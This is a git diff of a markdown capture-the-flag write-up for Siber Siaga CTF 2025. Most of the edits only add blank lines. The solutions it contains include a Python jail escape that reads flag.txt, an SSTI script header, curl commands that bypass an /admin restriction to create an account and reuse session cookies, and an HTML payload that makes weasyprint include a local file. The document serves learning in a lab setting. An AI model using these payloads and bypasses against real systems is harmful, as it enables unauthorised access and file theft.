@@ -10,12 +10,16 @@ tags: [Siber Siaga CTF 2025 (Preliminary)]
 {: .prompt-info}
 
 ## Challenge 1: Spelling Bee
+
 **Description:**
+
 Just spell the flag correctly then I will give it to you.
+
 Challenge Creator: @penguincat
 `nc 5.223.49.127 57004`
 
 **Answer:**
+
 Given the credentials for connecting and each time have 5 tries, while the 5th one will never show the results, so 4 try only
 
 ![](assets/img/siber-siaga-25/image1.png)
@@ -42,28 +46,39 @@ S_______s__________i__________________________
 {: .prompt-tip}
 
 ## Challenge 2: Entry to Meta City
+
 **Description:**
+
 To gain entry to the prestige city, you will first need to prove your worth unless you are an admin.
+
 Flag Format: SIBER25{flag} Challenge Creator: @penguincat
 `http://5.223.49.127:47001/`
 
 **Answer**
+
 ![](assets/img/siber-siaga-25/image2.png)
+
 Just enter admin and you will get the flag
+
 ![](assets/img/siber-siaga-25/image3.png)
 
 >Flag: `SIBER25{w3lc0m3_70_7h3_c00l357_c17y}`
 {: .prompt-tip}
 
 ## Challenge 3: A Byte Tales
+
 **Description:**
+
 Choose your path and decide your own fate.
+
 Challenge Creator: @penguincat Flag Format: SIBER25{flag}
+
 `nc 5.223.49.127 57001`
 
 **Answer:**
 
 ![](assets/img/siber-siaga-25/image4.png)
+
 ![](assets/img/siber-siaga-25/image5.png)
 
 Based on the source code given, you can see flag.txt which means the server will also have a file named flag.txt in it, now we just need to find ways to exploit it.
@@ -79,6 +94,7 @@ repr(open('flag.txt').read())
 ```
 
 Until i get this one 
+
 ```
 __builtins__.__dict__['pr'+'int'](open('flag.txt').read())
 ```
@@ -91,6 +107,7 @@ __builtins__.__dict__['pr'+'int'](open('flag.txt').read())
 ## Challenge 4: Easy Cipher
 
 **Description:**
+
 classic reverse
 
 Flag Format: SIBER25{flag}
@@ -105,7 +122,6 @@ https://chatgpt.com/share/68ce5c2e-f310-800e-b10d-a7c24a31a60a
 
 To sum up, the program function like : 
 - The program splits your candidate flag into two halves, processes each half with `FUN_0010137a`, and checks the two 16-byte results against two 16-byte constants.
-
 - `FUN_0010137a`:
   - Pads to 8-byte blocks and processes each 8-byte block as two 4-byte halves L0 and R0.
   - Runs two Feistel rounds (round numbers 1 and 2). The round function is `F(R, round) = R XOR key_shift(round)`, where `key_shift(round)[i] = key[(i + round) % keylen].`
@@ -128,12 +144,19 @@ Then, you will get the flag :
 {: .prompt-tip}
 
 ## Challenge 5: Dumpster Diving
+
 **Description:**
+
 Aiya. I accidentally deleted the flag when cleaning up my Desktop.
 
-Flag Format: SIBER25{flag} Zip Password: 0b20ca0c4860364140f51583e32bb28cdeecf13ebad62fd66b4f9786bf2c700d Challenge Creator: @identities
+Flag Format: SIBER25{flag} 
+
+Zip Password: 0b20ca0c4860364140f51583e32bb28cdeecf13ebad62fd66b4f9786bf2c700d 
+
+Challenge Creator: @identities
 
 **Answer:**
+
 Given an image file and .txt file. I immediately opened the image file using Exterro FTK Imager.
 
 ![](assets/img/siber-siaga-25/image7.png)
@@ -144,12 +167,19 @@ As I was traversing through the image file, I found multiple image files in the 
 {: .prompt-tip}
 
 ## Challenge 6: Viewport
+
 **Description:**
+
 Oops. I accidentally deleted the flag when cleaning up my Desktop.
 
-Flag Format: SIBER25{flag} Zip Password: e0ff450ab4c79a7810ad46b45f4b8f10678a63df866757566d17b8b998be4161 Challenge Creator: @identities
+Flag Format: SIBER25{flag} 
+
+Zip Password: e0ff450ab4c79a7810ad46b45f4b8f10678a63df866757566d17b8b998be4161 
+
+Challenge Creator: @identities
 
 **Answer:**
+
 Just like the Dumpster challenge, I quickly open the image file given using  Exterro FTK Imager. 
 
 ![](assets/img/siber-siaga-25/image8.png)
@@ -168,13 +198,19 @@ I check every single file and I see the flag in an image. Then I merged all the 
 {: .prompt-tip}
 
 ## Challenge 7: Guess PWD
+
 **Description:**
+
 only 4 digits, guess it !
+
 Flag Format: SIBER25{flag}
+
 Challenge Creator: @y_1_16
 
 **Answer:**
+
 I guess I'm pushing my luck again today.
+
 Given an apk file, so I'm using apktool (Sorry I'm just googling how to analyse apk files and apktool is one of the options) and in the command prompt i run this command to extract it.
 
 ```sh
@@ -191,12 +227,15 @@ Sorry for unintended solution 🙏
 {: .prompt-tip}
 
 ## Challenge 8: Deep on Adversarial
+
 **Description:**
+
 Recently, our AI Tech Support behaved strangely. During investigation, we discovered two odd files on the culprit device are identical to a suspicious file from our server. We suspect something malicious is hidden inside the image itself, but we couldn’t see it directly. Can you figure out how to uncover what’s within the image that can only be seen by AI?
 
 Flag Format: SIBER25{flag} Challenge Creator: @penguincat
 
 **Answer:**
+
 I'm using Github Copilot with Claude Sonnet 4 as a model in this challenge, here's the link for my [conversation](https://drive.google.com/file/d/1OPhHUuAXjbubUqqjEMs7aOXZWU_N_fHH/view?usp=sharing). For easy navigation, i suggest find requestID to see my prompt.
 
 So, here's the [code](https://drive.google.com/file/d/1dx0XkrEyqQ6Pv_3Ro1lp_v8DyNQAeSd9/view?usp=sharing) for solving the challenge. Below is one of the result from executing the code.
@@ -207,17 +246,22 @@ So, here's the [code](https://drive.google.com/file/d/1dx0XkrEyqQ6Pv_3Ro1lp_v8Dy
 {: .prompt-tip}
 
 ## Challenge 9: Bulk Import Blues (web)
+
 *Solved by: Jerit3787*
+
 **Description:**
+
 Acme’s internal inventory tool lets staff bulk import product data and check stock. I’m sure i made it secured but did i miss out anything?
 
 Flag format: SIBER25{flag}
+
 Challenge Creator: @jin_707
 
 **Solution:**
 The website allows users to enter user’s YAML scripts. Under the hood, the `/process` tag is allowing user’s input to be rendered immediately without sanitisation.
 
 Script used:
+
 ```py
 #!/usr/bin/env python3
 """
@@ -330,14 +374,19 @@ Data is sent by Base64 and when using CyberChef to change from Base64 produces t
 {: .prompt-tip}
 
 ## Challenge 10: EcoQuery (web)
+
 *Solved by: Jerit3787*
+
 **Description:**
+
 Welcome to EcoQuery: your trusted gateway to environmentally friendly data access. Only verified users can enter - administrators enjoy full system privileges, while guest accounts remain locked down.
 
 Flag Format: SIBER25{flag}
+
 Challenge Creator: @hanming0510
 
 **Solution:**
+
 The system allows users to login to the system.
 
 ![](assets/img/siber-siaga-25/image13.png)
@@ -406,13 +455,17 @@ curl -v -X POST \  -H "Content-Type: application/x-www-form-urlencoded" \
 {: .prompt-tip}
 
 ## Challenge 11: Private Party (web)
+
 *Solved by: Jerit3787*
+
 **Description:**
+
 This is a very secret and exclusive party for only special, powerful, wealthy and educated people and you are not invited.
 
 Challenge Creator: @penguincat
 
 **Solution:**
+
 Users are able to login if their accounts are created by Admin (so-called private & invitation only access)
 
 ![](assets/img/siber-siaga-25/image14.png)
@@ -422,6 +475,7 @@ To obtain access we need to access `/admin`. But, `/admin` is blocked by default
 When successfully accessed the admin panel, we can create our own account. For simplicity and reproducibility, I’ve completed using curl and managed sessions via cookies only.
 
 Create an account hacker with a password of password123.
+
 ```bash
 curl -X POST http://5.223.49.127:8001//admin \
  -H "Content-Type: application/json" \
@@ -432,6 +486,7 @@ curl -X POST http://5.223.49.127:8001//admin \
 After we have created an account, we got the so-called exclusive access. Now, let’s login to the page using our credentials that we just created.
 
 Login to the account using created credentials.
+
 ```bash
 curl -c live_cookies.txt \
  -X POST http://5.223.49.127:8001/login \
@@ -441,6 +496,7 @@ curl -c live_cookies.txt \
 After gaining access, the flag is located at the dashboard. Pulling the dashboard using the cookies gets us the flag.
 
 Fetch Flag on the dashboard using cookies session
+
 ```
 curl -b live_cookies.txt http://5.223.49.127:8001/dashboard
 ```
@@ -485,19 +541,25 @@ And the result is as follows:
 {: .prompt-tip}
 
 ## Challenge 12: Safe_PDF (Web)
+
 *Solved by: Jerit3787*
+
 **Description:**
+
 Need a PDF version of your favourite web page? This handy tool does just that - simply enter a URL, and we’ll generate a PDF snapshot for you. Quick, clean and convenient.
 
 Flag format: SIBER25{flag}
+
 Challenge Creator: @hanming0510
 
 **Solution:**
+
 For this one, I just solved similar to this. It uses a vulnerability I think that causes Local File Inclusion (LFI) that is when user’s input is not santised properly. Any html tags gets parsed by weasyprint (a popular html to pdf tool). 
 
 Thus, by crafting a HTML that causes weasyprint to include the file inside the PDF, we can control what items gets to enter the PDF.
 
 Create an html that attaches local file (flag)
+
 ```html
 <!doctype html>
 <html>
@@ -535,8 +597,11 @@ cat flag.txt
 {: .prompt-tip}
 
 ## Challenge 13: Puzzle (Blockchain)
+
 *Solved by: Jerit3787*
+
 **Description:**
+
 I found this smart contract in an old blockchain archive. The creator left a message inside, could you find it?
 
 The challenge is about the some left the data on the blockchain. Then, you need to find inside the blockchain to fetch the flag.
